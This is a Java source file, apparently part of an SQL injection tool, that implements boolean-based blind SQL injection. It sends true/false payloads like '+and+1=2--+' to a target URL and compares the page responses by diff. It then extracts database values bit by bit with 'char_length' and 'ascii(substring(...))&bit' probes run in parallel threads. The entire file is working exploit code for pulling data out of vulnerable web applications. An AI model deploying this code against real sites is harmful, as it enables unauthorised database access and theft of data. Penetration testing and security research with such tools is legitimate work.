package mvc.model.blind;

import java.util.ArrayList;
import java.util.LinkedList;
import java.util.List;
import java.util.concurrent.Callable;
import java.util.concurrent.CompletionService;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorCompletionService;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.TimeUnit;

import exception.PreparationException;
import exception.StoppableException;

import mvc.model.InjectionModel;
import mvc.model.Interruptable;
import mvc.model.Stoppable;

/**
 * Test branching
 */
public class BlindInjection {
	private String initialUrl;
	
	private String blankTrueMark;
	
	public List<diff_match_patch.Diff> constantFalseMark;
	private List<diff_match_patch.Diff> constantTrueMark;

	private InjectionModel injectionModel;

	public BlindInjection(InjectionModel newModel, String newUrl){
		injectionModel = newModel;
		
		if(injectionModel.isProxyfied){
			System.setProperty("http.proxyHost", injectionModel.proxyAdress);
			System.setProperty("http.proxyPort", injectionModel.proxyPort);
		}

		initialUrl = newUrl;
//		blankTrueMark = callUrl(initialUrl);
		blankTrueMark = callUrl("");
		
		String[] falseTest = {"true=false","true%21=true","false%21=false","1=2","1%21=1","2%21=2"};
				
		String[] trueTest = {"true=true","false=false","true%21=false","1=1","2=2","1%21=2"};
		
//		System.out.println(injectionModel.stopFlag);
		if(injectionModel.stopFlag)return;
		
		/* appelle les urls false */
		ExecutorService executorFalseMark = Executors.newCachedThreadPool();
		List<BlindCallable> listCallableFalse = new ArrayList<BlindCallable>();
		for (String urlTest: falseTest){
			listCallableFalse.add(new BlindCallable(/*initialUrl+*/"+and+"+urlTest+"--+"));
		}

		List<Future<BlindCallable>> listFalseMark;
		try {
			listFalseMark = executorFalseMark.invokeAll(listCallableFalse);
		} catch (InterruptedException e1) {
			e1.printStackTrace();
			return;
		}
		
		executorFalseMark.shutdown();
		
		/* suppression des opcode false non systématique */
		try {
			constantFalseMark = ((BlindCallable) listFalseMark.get(0).get()).opcodes;
//			System.out.println(">>>false "+constantFalseMark);
			for(Future<BlindCallable> falseMark: listFalseMark){
//				System.out.println(injectionModel.stopFlag);
				if(injectionModel.stopFlag)return;

				constantFalseMark.retainAll(((BlindCallable) falseMark.get()).opcodes);
			}
		} catch (InterruptedException e2) {
			e2.printStackTrace();
		} catch (ExecutionException e2) {
			e2.printStackTrace();
		}
//		System.out.println(">>>false-s "+constantFalseMark);
		
//		System.out.println(injectionModel.stopFlag);
		if(injectionModel.stopFlag)return;

		/* appelle les urls true */
		ExecutorService executorTrueMark = Executors.newCachedThreadPool();
		List<BlindCallable> listCallableTrue = new ArrayList<BlindCallable>();
		for (String urlTest: trueTest){
			listCallableTrue.add(new BlindCallable(/*initialUrl+*/"+and+"+urlTest+"--+"));
		}

		List<Future<BlindCallable>> listTrueMark;
		try {
			listTrueMark = executorTrueMark.invokeAll(listCallableTrue);
		} catch (InterruptedException e1) {
			e1.printStackTrace();
			return;
		}
		
		executorTrueMark.shutdown();

		try {
			constantTrueMark = ((BlindCallable) listTrueMark.get(0).get()).opcodes;
//			System.out.println(">>>true "+constantTrueMark);
			for(Future<BlindCallable> trueMark: listTrueMark){
//				System.out.println(injectionModel.stopFlag);
				if(injectionModel.stopFlag)return;

				/* suppression des opcode false présent parmi les true */
				constantFalseMark.removeAll(((BlindCallable) trueMark.get()).opcodes);
				/* suppression des opcode true non systématique */
				constantTrueMark.retainAll(((BlindCallable) trueMark.get()).opcodes);
			}
		} catch (InterruptedException e2) {
			e2.printStackTrace();
		} catch (ExecutionException e2) {
			e2.printStackTrace();
		}
		
//		System.out.println(">>> "+constantFalseMark);
//		System.out.println(">>> "+constantTrueMark);
	}
	
	public String inject(String inj, Interruptable interruptable, Stoppable s) throws StoppableException{
		final boolean IS_LENGTH_TEST = true;
		
		List<char[]> bytes = new ArrayList<char[]>();
		int indexCharacter = 0;

		ExecutorService taskExecutor = Executors.newCachedThreadPool();
        CompletionService<BlindCallable> taskCompletionService = new ExecutorCompletionService<BlindCallable>(taskExecutor);

        taskCompletionService.submit(new BlindCallable(/*initialUrl+*/"+and+char_length("+inj+")>0--+", IS_LENGTH_TEST));
        int submittedTasks = 1;
        
        while( submittedTasks > 0 ){
        	if(s.isPreparationStopped() || (interruptable != null && interruptable.isInterrupted())){
        		taskExecutor.shutdown();

        		// Wait for termination
        		boolean success = false;
				try {
					success = taskExecutor.awaitTermination(0, TimeUnit.SECONDS);
				} catch (InterruptedException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
        		if (!success) {
        		    // awaitTermination timed out, interrupt everyone
        			taskExecutor.shutdownNow();
        		}

        		throw new StoppableException();
        	}
			try {
	        	BlindCallable currentCallable = taskCompletionService.take().get();
	        	submittedTasks--;
				if(currentCallable.isLengthTest){
					if( currentCallable.isTrue() ){
						indexCharacter++;
						bytes.add(new char[]{'x','x','x','x','x','x','x','x'});
						taskCompletionService.submit(new BlindCallable(/*initialUrl+*/"+and+char_length("+inj+")>"+indexCharacter+"--+", IS_LENGTH_TEST));
						for(int bit: new int[]{1,2,4,8,16,32,64,128}){
							taskCompletionService.submit(new BlindCallable(/*initialUrl+*/"+and+ascii(substring("+inj+","+indexCharacter+",1))%26"+bit+"--+", indexCharacter, bit));
						}
						submittedTasks += 9;
					}
				}else{
					char[] e = bytes.get(currentCallable.currentIndex-1);
					e[(int) (8 - ( Math.log(2)+Math.log(currentCallable.currentBit) )/Math.log(2)) ] = currentCallable.isTrue() ? '1' : '0';
					
					try{
                        int charCode = Integer.parseInt(new String(e), 2);
                        String str = new Character((char)charCode).toString();
                        injectionModel.new GUIThread("binary-message","\t"+new String(e)+"="+str).run();
                    }catch(NumberFormatException err){}
				}
//	        	System.out.println(currentCallable.blindUrl);
			} catch (InterruptedException e) {
				e.printStackTrace();
			} catch (ExecutionException e) {
				e.printStackTrace();
			}
        }
        
        try {
	        taskExecutor.shutdown();
			taskExecutor.awaitTermination(15, TimeUnit.SECONDS);
		} catch (InterruptedException e) {
			e.printStackTrace();
		}
        
		String result = "";
		for(char[] c: bytes){
			int charCode = Integer.parseInt(new String(c), 2);
			String str = new Character((char)charCode).toString();
			result += str;
		}	
//		System.out.println("nb caractères: "+indexChar);
//		System.out.println("résultat: "+result);
		return result;
	}
	
	private class BlindCallable implements Callable<BlindCallable>{
		private String blindUrl;
		
		private int currentIndex;
		private int currentBit;
		
		private boolean isLengthTest = false;
		
		private LinkedList<diff_match_patch.Diff> opcodes;
		
		BlindCallable(String newUrl){
			blindUrl = newUrl;
		}
		BlindCallable(String newUrl, int newIndex, int newBit){
			this(newUrl);
			currentIndex = newIndex;
			currentBit = newBit;
		}
		BlindCallable(String newUrl, boolean newIsLengthTest){
			this(newUrl);
			isLengthTest = newIsLengthTest;
		}
		
		public boolean isTrue() {
			for( diff_match_patch.Diff falseDiff: constantFalseMark){
				if(opcodes.contains(falseDiff)){
					return false;
				}
			}
			return true;
		}

		@Override
		public BlindCallable call() throws Exception {		
			String ctnt = callUrl(blindUrl);
			opcodes = new diff_match_patch().diff_main(blankTrueMark, ctnt, true);
			new diff_match_patch().diff_cleanupEfficiency(opcodes);
			return this;
		}
	}
	
	public String callUrl(String urlString){
		return injectionModel.inject(injectionModel.insertionCharacter + urlString);
	}
	
	public boolean isBlindInjectable() throws PreparationException{
		if(injectionModel.stopFlag)
			throw new PreparationException();
		BlindCallable blindTest = new BlindCallable(/*initialUrl+*/"+and+0%2b1=1--+");
		try {
			blindTest.call();
		} catch (Exception e) {
			e.printStackTrace();
		}
		return constantFalseMark != null && blindTest.isTrue() && constantFalseMark.size() > 0;
	}
}
